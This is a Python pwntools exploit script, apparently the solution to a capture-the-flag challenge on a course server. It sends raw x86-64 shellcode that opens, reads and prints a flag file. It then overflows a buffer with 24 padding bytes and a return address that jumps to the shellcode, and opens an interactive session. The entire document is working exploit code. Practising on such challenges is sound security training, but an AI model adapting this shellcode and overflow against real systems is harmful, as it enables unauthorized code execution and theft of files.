#!/usr/bin/env python

from pwn import *

shellcode = "\x50\x49\xB8\x77\x2F\x66\x6C\x61\x67\x00\x00\x41\x50\x49\xB8\x2F\x68\x6F\x6D\x65\x2F\x6F\x72\x41\x50\x54\x5F\x48\x31\xC0\x04\x02\x48\x31\xF6\x48\x31\xD2\x0F\x05\x66\x83\xEC\x30\x48\x8D\x34\x24\x48\x89\xC7\x48\x31\xD2\x48\x83\xC2\x30\x48\x31\xC0\x0F\x05\x48\x31\xFF\x48\x83\xC7\x01\x48\x31\xC0\x48\x83\xC0\x01\x0F\x05\x48\x31\xC0\x48\x83\xC0\x3C\x0F\x05"

r = remote('edu-ctf.csie.org', 10171)
print r.recv()
r.sendline(shellcode)
print r.recvuntil(':)\n')
r.sendline('A'*24 + p64(0x6010a0))
r.interactive()